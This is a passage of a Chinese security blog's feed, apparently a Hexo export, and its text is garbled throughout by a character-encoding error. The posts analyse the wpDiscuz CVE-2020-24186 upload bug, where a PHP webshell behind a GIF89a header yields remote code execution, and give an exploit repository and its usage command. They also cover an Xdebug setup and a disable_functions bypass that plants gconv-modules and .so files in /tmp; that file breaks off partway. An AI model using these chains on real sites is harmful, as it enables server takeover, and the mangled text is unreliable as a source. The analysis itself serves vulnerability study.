æ‰§è¡Œã€‚</p><h3 id="æ¼æ´åŸå› ï¼š"><a href="#æ¼æ´åŸå› ï¼š" class="headerlink" title="æ¼æ´åŸå› ï¼š"></a>æ¼æ´åŸå› ï¼š</h3><p>è¿™ä¸ªCVEä¸»è¦æ˜¯ç”¨æˆ·åœ¨ç›®æ ‡ç«™ç‚¹è¿›è¡Œè¯„è®ºæ—¶ï¼Œå¯ä»¥è¿›è¡Œä¸Šä¼ å›¾ç‰‡æ–‡ä»¶è¿›è¡Œè¯„è®ºï¼Œå°è¯•æ–‡ä»¶ä¸Šä¼ åä½¿ç”¨burpsuitæŠ“åŒ…ï¼Œå¯ä»¥å‘æ–‡ä»¶å†…å®¹æ·»åŠ æ–‡ä»¶å¤´å¦‚GIF89aï¼Œå³åˆ»ä¸Šä¼ æˆåŠŸã€‚å› ä¸ºæ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤å’Œæ–‡ä»¶ååç¼€çš„æ£€æµ‹ï¼Œä¸­é—´è¿‡ç¨‹æœ‰ä½¿ç”¨phpçš„getimagesizeå‡½æ•°æ¥å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œåˆ¤æ–­æ‰§è¡Œï¼Œè¯¥å‡½æ•°è¿”å›ç»“æœä¸­æœ‰æ–‡ä»¶å¤§å°å’Œæ–‡ä»¶ç±»å‹ï¼Œå¦‚æœç”¨è¿™ä¸ªå‡½æ•°è·å–æ–‡ä»¶ç±»å‹å°±ä¼šæœ‰é—®é¢˜ï¼Œå¯ä»¥åŠ ä¸Šå¯¹åº”çš„å›¾ç‰‡æ–‡ä»¶å¤´æ¥ä¼ªé€ å›¾ç‰‡ç±»å‹ï¼Œå› æ­¤å³å¯ä¸Šä¼ phpæ–‡ä»¶æˆåŠŸã€‚</p><p>å“åº”åŒ…ä¸­è¿”å›äº†æ–‡ä»¶ä¸Šä¼ åçš„è·¯å¾„ï¼Œè®¿é—®å³å¯é€ æˆå¯¹åº”çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><p>ç»¼ä¸Šï¼Œåˆ©ç”¨é“¾ä¸ºï¼šåœ¨wpDiscuzæ¨¡å—ä¸Šä¼ phpæ–‡ä»¶æ—¶ä½¿ç”¨burpsuitæŠ“åŒ…ï¼Œå†™å…¥å›¾ç‰‡æ–‡ä»¶å¤´ï¼Œä¾‹GIF89aï¼Œåœ¨åé¢å†™å…¥ç›¸åº”çš„webshellï¼Œä¸Šä¼ åæŸ¥çœ‹æ–‡ä»¶æ‰€åœ¨è·¯å¾„ï¼Œè®¿é—®å³å¯è¾¾åˆ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚</p><h3 id="å½±å“äº§å“ï¼š"><a href="#å½±å“äº§å“ï¼š" class="headerlink" title="å½±å“äº§å“ï¼š"></a>å½±å“äº§å“ï¼š</h3><p>wpDiscuz 7.0.0 â€“ 7.0.4</p><h2 id="è¡¥ä¸åˆ†æ"><a href="#è¡¥ä¸åˆ†æ" class="headerlink" title="è¡¥ä¸åˆ†æ"></a>è¡¥ä¸åˆ†æ</h2><p>å‡çº§wpDiscuzç‰ˆæœ¬ã€‚</p><p>isAllowedFileTypeå‡½æ•°ä¸­å¯¹extensionåç¼€è¿›è¡Œäº†æ£€æµ‹ï¼Œå½“MIMEä¸åç¼€ä¸ä¸€æ ·æ—¶ä¼šåœ¨è¿›å…¥æœ€åä¸€æ­¥ä¹‹å‰è¿”å›Falseï¼Œä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨MIMEçš„ç™½åå•æ¥å¯¹ä¸Šä¼ æ–‡ä»¶çš„åç¼€è¿›è¡Œäº†é™åˆ¶ã€‚</p><p><img src="/images/wpdiscuz/12.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/12.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><h2 id="æ¼æ´è°ƒè¯•ç¯å¢ƒæ­å»º"><a href="#æ¼æ´è°ƒè¯•ç¯å¢ƒæ­å»º" class="headerlink" title="æ¼æ´è°ƒè¯•ç¯å¢ƒæ­å»º"></a>æ¼æ´è°ƒè¯•ç¯å¢ƒæ­å»º</h2><p>Wordpress5.4.1ä¸‹è½½åœ°å€ï¼š</p><p><a href="https://cn.wordpress.org/wordpress-5.4.1-zh_CN.tar.gz">https://cn.wordpress.org/wordpress-5.4.1-zh_CN.tar.gz</a></p><p>wpDiscuz7.0.4ä¸‹è½½åœ°å€ï¼š</p><p><a href="https://downloads.wordpress.org/plugin/wpdiscuz.7.0.4.zip">https://downloads.wordpress.org/plugin/wpdiscuz.7.0.4.zip</a></p><p>åœ¨æœ¬æœºçš„windowsç¯å¢ƒä¸‹æ­å»ºï¼š</p><p>1ã€ä¸‹è½½phpstudyå¯åŠ¨ç›¸åº”çš„webæœåŠ¡ï¼Œæå‰åœ¨mysqlå»ºç«‹ä¸€ä¸ªwordpressæ•°æ®åº“ã€‚</p><p>2ã€å°†wordpressè§£å‹åˆ°wwwç›®å½•ä¸‹ã€‚</p><p>3ã€å°†wpDiscuzè§£å‹åˆ°WWW\wordpress\wp-content\pluginsç›®å½•ä¸‹ã€‚</p><p>4ã€è®¿é—®wordpressæŒ‰ç…§æ­¥éª¤æ­å»ºç½‘ç«™ã€‚</p><p>5ã€è¿›å…¥åˆ°wordpressåå°å¼€å¯wpDiscuzæ’ä»¶å³å¯ã€‚</p><h2 id="æ¼æ´ä»£ç åˆ†æ"><a href="#æ¼æ´ä»£ç åˆ†æ" class="headerlink" title="æ¼æ´ä»£ç åˆ†æ"></a>æ¼æ´ä»£ç åˆ†æ</h2><p>ã€è¯¦ç»†åˆ†æè¿‡ç¨‹ï¼Œéœ€è¦ç»™å‡ºå…³é”®ä»£ç ç‰‡æ®µæˆ–æˆªå›¾ã€‘</p><p>ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶å°è¯•burpsuitæŠ“åŒ…ï¼Œå‘ç°æ˜¯å‘wordpress&#x2F;wp-admin&#x2F;admin-ajax.phpå‘é€è¯·æ±‚</p><p><img src="/images/wpdiscuz/1.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/1.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>äºæ˜¯å»åˆ†æadmin-ajax.php,ä¸€å¼€å§‹æ²¡æœ‰æŸ¥åˆ°ä»€ä¹ˆï¼Œåé¢å‘ç°requireäº†ajax-actions.php</p><p><img src="/images/wpdiscuz/2.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/2.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>å¼€å§‹åˆ†æajax-actions.phpï¼Œå®šä½åˆ°ä¸Šä¼ æ¨¡å—ï¼Œåœ¨wp_ajax_upload_atachmentè¿™ä¸ªå‡½æ•°é‡Œé¢ï¼Œå¯ä»¥å‘ç°å¯¹ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹è¿›è¡Œäº†é™åˆ¶ï¼Œ</p><p><img src="/images/wpdiscuz/3.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/3.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>ä¸€ä¸ªä¸ªè¿½æº¯åˆ†æè‚¯å®šæœ‰ç‚¹éº»çƒ¦ï¼Œäºæ˜¯æ¥ä¸‹æ¥è¿½è¸ªä¸€äº›æœ‰ç”¨çš„å‡½æ•°å¼€å§‹æ‰“ä¸Šæ–­ç‚¹ï¼Œç„¶åä¸Šä¼ æ–‡ä»¶ä¸€ç‚¹ä¸€ç‚¹è¿›è¡Œdebugè°ƒè¯•ï¼Œè¿›è¡Œè¯¦ç»†çš„è§£æï¼Œä¸€è·¯debugï¼Œæœ€ç»ˆç¡®å®šèƒ½å¤Ÿé€ æˆæ¼æ´ç‚¹å¤§è‡´çš„ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="/%5Cimages/wpdiscuz/4.jpg" class="lazyload placeholder" data-srcset="/%5Cimages/wpdiscuz/4.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>ä¸Šä¼ ä¸€ä¸ªphpåç¼€çš„æ–‡ä»¶å¹¶ä¸”åŠ ä¸Šæ–‡ä»¶å¤´GIF89a,ä»äº§ç”Ÿæ¼æ´çš„åœ°æ–¹å¼€å§‹è¿½è¸ªï¼Œå¯ä»¥å…¨å±€æœç´¢æŸ¥çœ‹å“ªé‡Œä½¿ç”¨äº†@getimagesizeå‡½æ•°ï¼Œæœ€ç»ˆå‘ç°åœ¨wp_get_image_mimeå‡½æ•°é‡Œé¢ï¼Œè¿™é‡Œå°±å› ä¸ºæ–‡ä»¶å¤´çš„ä¼ªé€ ä½¿æœ€ç»ˆreturnçš„mimeå˜æˆäº†image&#x2F;gifã€‚</p><p><img src="/images/wpdiscuz/5.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/5.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>ç»§ç»­è¿½è¸ªï¼Œè¿”å›åˆ°è°ƒç”¨çš„å‡½æ•°ï¼Œå‘ç°æ˜¯å…ˆè°ƒç”¨äº†isImageå‡½æ•°ï¼Œå†åœ¨é‡Œé¢è°ƒç”¨äº†wp_get_image_mimeå‡½æ•°ã€‚</p><p><img src="/images/wpdiscuz/6.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/6.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>åœ¨åç»­çš„æ£€éªŒä¸­ï¼ŒæŒç»­ç»•è¿‡æ£€æµ‹ï¼ŒæˆåŠŸä¸Šä¼ æ–‡ä»¶</p><p><img src="/images/wpdiscuz/7.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/7.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>è¿™é‡Œç¡®å®šäº†mimeç±»å‹åï¼Œç”±äºæ˜¯image&#x2F;gifï¼Œå°±ä¼šå‘$attachmentIdså†™å…¥å¯¹åº”çš„å€¼</p><p><img src="/images/wpdiscuz/8.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/8.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>æœ€ç»ˆæ ¹æ®$attachmentIdsæ ¡éªŒ,æˆåŠŸå†™å…¥è¿”å›åŒ…çš„æ•°æ®ï¼Œå†™å…¥æˆåŠŸã€‚</p><p><img src="/images/wpdiscuz/9.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/9.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><p>æœ€åæŸ¥çœ‹è¿”å›åŒ…çš„å†…å®¹ç¡®å®šä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ï¼Œè®¿é—®å³å¯æ‰§è¡Œå¯¹åº”çš„webshellã€‚</p><p><img src="/images/wpdiscuz/10.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/10.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><h2 id="æ­¦å™¨åŒ–åˆ©ç”¨"><a href="#æ­¦å™¨åŒ–åˆ©ç”¨" class="headerlink" title="æ­¦å™¨åŒ–åˆ©ç”¨"></a>æ­¦å™¨åŒ–åˆ©ç”¨</h2><p>æœ‰å¸ˆå‚…å·²ç»å†™å‡ºæ¥äº†ï¼Œæˆ‘å°±æ¨¡ä»¿ç€è‡ªå·±å†å†™äº†ä¸€ä¸ªï¼Œæœ€ç»ˆæµ‹è¯•å¯ä»¥å®ç°äº†ä¸Šä¼ webshellä¹‹åè¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œã€‚  </p><p>æºç ï¼š<a href="https://github.com/Sakura-501/CVE-2020-24186-exploit">https://github.com/Sakura-501/CVE-2020-24186-exploit</a></p><p>Expä½¿ç”¨æ–¹æ³•ï¼š</p><p>Commands:</p><p>- Windows&#x2F;Linux:</p><p>python3 CVE-2020-24186.py -u <Base_Host> -p <BlogPost_URL> </p><p>Exampleï¼š</p><p>python3 CVE-2020-24186.py -u <a href="http://127.0.0.1/">http://127.0.0.1</a> -p &#x2F;wordpress&#x2F;2022&#x2F;04&#x2F;04&#x2F;hello-world</p><p><img src="/images/wpdiscuz/11.jpg" class="lazyload placeholder" data-srcset="/images/wpdiscuz/11.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"> </p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™ä¸ªcveæ—©æœ‰å¸ˆå‚…åˆ†æå®Œäº†ï¼Œæˆ‘å…ˆçœ‹äº†ä¸€éå¸ˆå‚…ä»¬çš„åˆ†æï¼Œç„¶åè‡ªå·±å»æ­å»ºç¯å¢ƒåˆ†æä¸€éåˆæ˜¯ä¸ä¸€æ ·çš„æ”¶è·ï¼Œè‡ªå·±debugä¸€éä¼šå¯¹è¿™ä¸€ä¸ªæ¼æ´ç‚¹æœ‰ç€æ›´æ·±åˆ»çš„å‘ç°ã€‚ä¸€å¼€å§‹æˆ‘æŒ‰ç…§å¸ˆå‚…ä»¬çš„åˆ†äº«çš„æ€è·¯åˆ†æï¼Œå‘ç°å¹¶ä¸æ˜¯å¾ˆæ­£ç¡®ï¼Œäºæ˜¯è‡ªå·±å»æ…¢æ…¢çœ‹æºä»£ç æ‰å‘ç°å¸ˆå‚…ä»¬æ›´ç»†èŠ‚çš„åœ°æ–¹å¹¶æ²¡æœ‰è®²æ¸…æ¥šï¼Œæ‰€ä»¥å¯¼è‡´ä¸€å¼€å§‹çš„æˆ‘çœ‹çš„ä¸æ˜¯å¾ˆæ‡‚ã€‚æ¯”å¦‚ä¸€å¼€å§‹æˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆå¯ä»¥åŠ ä¸ŠGIF89aæ–‡ä»¶å¤´å°±èƒ½ä¸Šä¼ æˆåŠŸï¼Œå¸ˆå‚…ä»¬çš„æ–‡ç« ä¹Ÿæ²¡æœ‰è¯¦ç»†å†™æ¸…æ¥šã€‚äºæ˜¯è‡ªå·±ä¸æ–­ä¸‹æ–­ç‚¹ï¼Œæ…¢æ…¢debugï¼Œæœ€åå‘ç°æ˜¯åœ¨phpçš„ä¸€ä¸ªåŸç”Ÿå‡½æ•°getimagesizeå‡ºç°äº†é—®é¢˜ï¼Œå¯ä»¥è¿›è¡Œæ–‡ä»¶å¤´ä¼ªé€ ç»•è¿‡ã€‚æ‰€ä»¥æ¼æ´æŒ–æ˜çš„å¤ç°éœ€è¦äº²è‡ªå®ç°ä¸€éæ‰ä¼šæ˜ç™½æ›´å¤šç»†èŠ‚ã€‚</p><p>ç¬¬ä¸€æ¬¡å†™exploitï¼Œç…§ç€å¸ˆå‚…ä»¬çš„expæˆ‘è‡ªå·±å†™äº†ä¸€éï¼ŒåŸºæœ¬äº†è§£äº†pythonæ˜¯å¦‚ä½•è¿›è¡Œexpçš„ç¼–å†™ï¼Œè‡ªå·±ä¹Ÿå­¦ä¹ åˆ°äº†å¾ˆå¤šæ–°çš„ä¸œè¥¿ï¼Œæ¯”å¦‚Pythonçš„optparseå¯ä»¥è§£æè„šæœ¬è¾“å…¥çš„å‚æ•°å€¼ç­‰ç­‰ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://www.cnblogs.com/sukusec301/p/15813117.html">https://www.cnblogs.com/sukusec301/p/15813117.html</a></p><p><a href="https://www.exploit-db.com/exploits/49962">https://www.exploit-db.com/exploits/49962</a></p><p><a href="https://blog.csdn.net/qq_40989258/article/details/108753535">https://blog.csdn.net/qq_40989258/article/details/108753535</a></p><p><a href="https://github.com/h3v0x/CVE-2020-24186-WordPress-wpDiscuz-7.0.4-RCE">https://github.com/h3v0x/CVE-2020-24186-WordPress-wpDiscuz-7.0.4-RCE</a></p><p><a href="https://www.pythonf.cn/read/158357">https://www.pythonf.cn/read/158357</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPSTORMå¦‚ä½•è¿›è¡Œé¡¹ç›®çš„debug</title>
      <link href="/2022/04/04/phpstorm-ru-he-jin-xing-xiang-mu-de-debug/"/>
      <url>/2022/04/04/phpstorm-ru-he-jin-xing-xiang-mu-de-debug/</url>
      
        <content type="html"><![CDATA[<h3 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h3><p>å› ä¸ºè¦è¿›è¡Œwordpressçš„cveå¤ç°ï¼Œæ‰€ä»¥éœ€è¦å¯¹æŸäº›ä»£ç è¿›è¡Œdebugï¼Œå¯ä»¥ç†è§£çš„æ›´å¿«ä¸€äº›ï¼Œæ‰€ä»¥æŸ¥è¯¢åˆ°PHPstormå¯ä»¥åˆ©ç”¨xdebugæ¥è¿›è¡Œé¡¹ç›®çš„debugï¼Œæ‰€ä»¥å°è¯•äº†å¥½é•¿ä¸€æ®µæ—¶é—´ï¼Œç»ˆäºç®—æ˜¯æˆåŠŸäº†ã€‚</p><h3 id="å€Ÿé‰´æ–‡ç« "><a href="#å€Ÿé‰´æ–‡ç« " class="headerlink" title="å€Ÿé‰´æ–‡ç« "></a>å€Ÿé‰´æ–‡ç« </h3><p><a href="https://blog.csdn.net/weixin_39988164/article/details/116510119">https://blog.csdn.net/weixin_39988164/article/details/116510119</a></p><p><a href="https://ask.csdn.net/questions/781008">https://ask.csdn.net/questions/781008</a></p><p><a href="http://i.lckiss.com/?p=4370">http://i.lckiss.com/?p=4370</a></p><p><a href="https://blog.csdn.net/maxwoods/article/details/80458374">https://blog.csdn.net/maxwoods/article/details/80458374</a></p><p>è¿˜æœ‰ä¸€äº›æ¯”è¾ƒå‘çš„ç‚¹ï¼š</p><p>xdebugæ–­æ‰è°ƒè¯•ç»å¸¸æ— æ•…æ–­å¼€ï¼š</p><p><a href="https://blog.csdn.net/qq_26486949/article/details/88857757">https://blog.csdn.net/qq_26486949/article/details/88857757</a></p><p><a href="https://blog.csdn.net/qq_41566366/article/details/100898604">https://blog.csdn.net/qq_41566366/article/details/100898604</a></p><p>æŸ¥é˜…ä»¥ä¸Šæ–‡ç« ï¼ŒåŠ ä¸Šæ ¹æ®è‡ªå·±çš„æœ¬åœ°ç¯å¢ƒè¿›è¡Œä¸€äº›æ›´æ”¹ä¹‹åï¼Œå°±åŸºæœ¬å¯ä»¥è¿›è¡Œdebugäº†ï¼Œå¤§åŠŸå‘Šæˆï¼</p><h3 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h3><pre class="line-numbers language-none"><code class="language-none">[Xdebug]zend_extension&#x3D;D:&#x2F;phpstudty8.1&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;php&#x2F;php8.0.2nts&#x2F;ext&#x2F;php_xdebug.dllxdebug.remote_enable&#x3D;Onxdebug.remote_host&#x3D;127.0.0.1xdebug.remote_port&#x3D;9003xdebug.remote_handler&#x3D;dbgpxdebug.remote_mode &#x3D; reqxdebug.mode&#x3D;debugxdebug.idekey&#x3D;PHPSTORMxdebug.collect_params&#x3D;1xdebug.collect_return&#x3D;1xdebug.auto_trace&#x3D;Offxdebug.trace_output_dir&#x3D;D:&#x2F;phpstudty8.1&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;php_log&#x2F;php8.0.2nts.xdebug.tracexdebug.profiler_enable&#x3D;Offxdebug.profiler_output_dir&#x3D;D:&#x2F;phpstudty8.1&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;php_log&#x2F;php8.0.2nts.xdebug.profiler<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ©ç”¨gconv_moduleså’Œiconvè¿›è¡Œbypass disablele_function</title>
      <link href="/2022/04/03/li-yong-gconv-modules-he-iconv-jin-xing-bypass-disablele-function/"/>
      <url>/2022/04/03/li-yong-gconv-modules-he-iconv-jin-xing-bypass-disablele-function/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ–‡ä¸»è¦å†…å®¹æ¥æºäº</p><p><a href="https://blog.csdn.net/qq_42303523/article/details/117911859">ä½¿ç”¨GCONV_PATHä¸iconvè¿›è¡Œbypass disable_functions</a></p><p><a href="https://blog.csdn.net/nicholas_duan/article/details/84397431">linux ä»€ä¹ˆæ˜¯SOæ–‡ä»¶</a></p><p>ç›¸å…³èµ›é¢˜ä¸¤ä¸ªwpå­¦ä¹ ï¼š</p><p><a href="https://erroratao.github.io/writeup/DASCTF2022xSU/">dasctf2022-upgdload</a></p><p><a href="https://blog.csdn.net/weixin_51458899/article/details/123782291">dasctf2022-upgdloadçš„å…³äºphp:&#x2F;&#x2F;filterçš„å¦™ç”¨</a></p><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p><code>glibc</code>ï¼š<em>glibc</em>æ˜¯GNUå‘å¸ƒçš„libcåº“ï¼Œå³cè¿è¡Œåº“ã€‚<em>glibc</em>æ˜¯linuxç³»ç»Ÿä¸­æœ€åº•å±‚çš„apiï¼Œå‡ ä¹å…¶å®ƒä»»ä½•è¿è¡Œåº“éƒ½ä¼šä¾èµ–äº<em>glibc</em>ã€‚<em>glibc</em>é™¤äº†å°è£…linuxæ“ä½œç³»ç»Ÿæ‰€æä¾›çš„ç³»ç»ŸæœåŠ¡å¤–ï¼Œå®ƒæœ¬èº«ä¹Ÿæä¾›äº†è®¸å¤šå…¶å®ƒä¸€äº›å¿…è¦åŠŸèƒ½æœåŠ¡çš„å®ç°ã€‚  </p><p><code>.soæ–‡ä»¶</code>ï¼šshared objectï¼Œsoæ–‡ä»¶æ˜¯Linuxä¸‹çš„ç¨‹åºå‡½æ•°åº“,å³ç¼–è¯‘å¥½çš„å¯ä»¥ä¾›å…¶ä»–ç¨‹åºä½¿ç”¨çš„ä»£ç å’Œæ•°æ®ï¼Œä¸windowsä¸‹çš„dllæ–‡ä»¶å·®ä¸å¤šï¼Œå°±æ˜¯å¸¸è¯´çš„åŠ¨æ€é“¾æ¥åº“ï¼Œéƒ½æ˜¯cæˆ–c++ç¼–è¯‘å‡ºæ¥çš„ã€‚  ä¹Ÿæ˜¯ELFæ ¼å¼æ–‡ä»¶ï¼Œå…±äº«åº“ï¼ˆåŠ¨æ€åº“ï¼‰ï¼Œç±»ä¼¼äºDLLã€‚èŠ‚çº¦èµ„æºï¼ŒåŠ å¿«é€Ÿåº¦ï¼Œä»£ç å‡çº§ç®€åŒ–ã€‚ </p><p><code>GCONV_PATH</code>ï¼šlinuxç³»ç»Ÿä¸‹çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œè¯¥ç¯å¢ƒå˜é‡èƒ½ä½¿glibcä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„gconv-modulesæ–‡ä»¶  </p><p>æ€ä¹ˆç”Ÿæˆä»¥åŠä½¿ç”¨ä¸€ä¸ªsoåŠ¨æ€åº“æ–‡ä»¶? <code>gcc -fPIC -g -c s.c -o libs.o </code>  </p><p><code>-fPIC</code>ï¼š-fPICä½œç”¨äºç¼–è¯‘é˜¶æ®µï¼Œå‘Šè¯‰ç¼–è¯‘å™¨äº§ç”Ÿä¸ä½ç½®æ— å…³ä»£ç (Position-Independent Code)ï¼Œåˆ™äº§ç”Ÿçš„ä»£ç ä¸­ï¼Œæ²¡æœ‰ç»å¯¹åœ°å€ï¼Œå…¨éƒ¨ä½¿ç”¨ç›¸å¯¹åœ°å€ï¼Œæ•…è€Œä»£ç å¯ä»¥è¢«åŠ è½½å™¨åŠ è½½åˆ°å†…å­˜çš„ä»»æ„ ä½ç½®ï¼Œéƒ½å¯ä»¥æ­£ç¡®çš„æ‰§è¡Œã€‚è¿™æ­£æ˜¯å…±äº«åº“æ‰€è¦æ±‚çš„ï¼Œå…±äº«åº“è¢«åŠ è½½æ—¶ï¼Œåœ¨å†…å­˜çš„ä½ç½®ä¸æ˜¯å›ºå®šçš„ã€‚  </p><p><code>-g</code>:ä»¤ gcc ç”Ÿæˆè°ƒè¯•ä¿¡æ¯,è¯¥é€‰é¡¹å¯ä»¥åˆ©ç”¨æ“ä½œç³»ç»Ÿçš„â€œåŸç”Ÿæ ¼å¼ï¼ˆnative formatï¼‰â€ç”Ÿæˆè°ƒè¯•ä¿¡æ¯ã€‚GDB å¯ä»¥ç›´æ¥åˆ©ç”¨è¿™ä¸ªä¿¡æ¯ï¼Œå…¶å®ƒè°ƒè¯•å™¨ä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ä¸ªè°ƒè¯•ä¿¡æ¯ã€‚  </p><p><code>-c</code>ï¼šä»…æ‰§è¡Œç¼–è¯‘æ“ä½œï¼Œä¸è¿›è¡Œè¿æ¥æ“ä½œã€‚</p><p><code>-o</code>ï¼šæŒ‡å®šç”Ÿæˆçš„è¾“å‡ºæ–‡ä»¶åç§° ã€‚</p><h4 id="ä¸»è¦æµç¨‹ï¼š"><a href="#ä¸»è¦æµç¨‹ï¼š" class="headerlink" title="ä¸»è¦æµç¨‹ï¼š"></a>ä¸»è¦æµç¨‹ï¼š</h4><p>Â·linuxç¯å¢ƒä¸‹ï¼Œphpåœ¨æ‰§è¡Œ<code>iconv</code>å‡½æ•°æ—¶ä¼šå»è°ƒç”¨<code>glibc</code>çš„<code>iconv_open</code>å‡½æ•°  </p><p>Â·iconv_openå‡½æ•°ä¼šé¦–å…ˆå»å¯»æ‰¾ç³»ç»Ÿæä¾›çš„gconv-modulesæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶åŒ…å«äº†æ‰€æœ‰å­—ç¬¦é›†çš„ç›¸å…³ä¿¡æ¯å­˜å‚¨è·¯å¾„ï¼Œæ¯ä¸ªå­—ç¬¦é›†ä¿¡æ¯éƒ½å­˜å‚¨åœ¨ä¸€ä¸ª.soæ–‡ä»¶ä¸­ï¼Œå³gconv-modulesæ–‡ä»¶æä¾›æ¯ä¸€ä¸ªå­—ç¬¦é›†çš„.soæ–‡ä»¶çš„è¯¦ç»†ä½ç½®ã€‚</p><p>Â·ç„¶åæŸ¥è¯¢åˆ°ä½ç½®ä¹‹åå°±å»è°ƒç”¨å¯¹åº”çš„.soæ–‡ä»¶</p><p>Â·ç„¶åè°ƒç”¨.soæ–‡ä»¶ä¸­çš„gconvå’Œgconv_initå‡½æ•°ï¼Œè¾¾åˆ°å‘½ä»¤æ³¨å…¥çš„ç›®çš„</p><h3 id="bypassä¸»è¦è¿‡ç¨‹"><a href="#bypassä¸»è¦è¿‡ç¨‹" class="headerlink" title="bypassä¸»è¦è¿‡ç¨‹"></a>bypassä¸»è¦è¿‡ç¨‹</h3><p>é¦–å…ˆä¸€èˆ¬åœ¨&#x2F;tmpæ–‡ä»¶å¤¹ä¸‹é¢ä¸Šä¼ gconv-modulesæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸­æŒ‡å®šæˆ‘ä»¬è‡ªå®šä¹‰çš„çš„å­—ç¬¦é›†.soæ–‡ä»¶ï¼Œ.soæ–‡ä»¶ä¸­ä¹¦å†™gconv_initå‡½æ•°ï¼Œå…¶ä¸­å¡«å…¥æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤æˆ–å…¶ä»–å±é™©æ“ä½œã€‚ç„¶åæˆ‘ä»¬éœ€è¦ä¸Šä¼ ä¸€ä¸ªphpçš„shellï¼Œé‡Œé¢å…ˆæŒ‡å®šgconv_pathæ¥æŒ‡å‘æˆ‘ä»¬è‡ªå·±ä¸Šä¼ çš„gconv-modulesæ–‡ä»¶ï¼Œæœ€åè°ƒç”¨iconvå‡½æ•°æ¥æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç ã€‚</p><h4 id="å®æˆ˜æ¨¡æ‹Ÿ"><a href="#å®æˆ˜æ¨¡æ‹Ÿ" class="headerlink" title="å®æˆ˜æ¨¡æ‹Ÿ"></a>å®æˆ˜æ¨¡æ‹Ÿ</h4><p>é¦–å…ˆå†™ä¸€ä¸ªgconv-modulesæ–‡ä»¶ä¸Šä¼ åˆ°&#x2F;tmpç›®å½•ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">module  INTERNAL    è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå¤§å†™ï¼‰&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;è‡ªå®šä¹‰å­—ç¬¦é›†åå­—ï¼ˆå°å†™ï¼‰    2 module  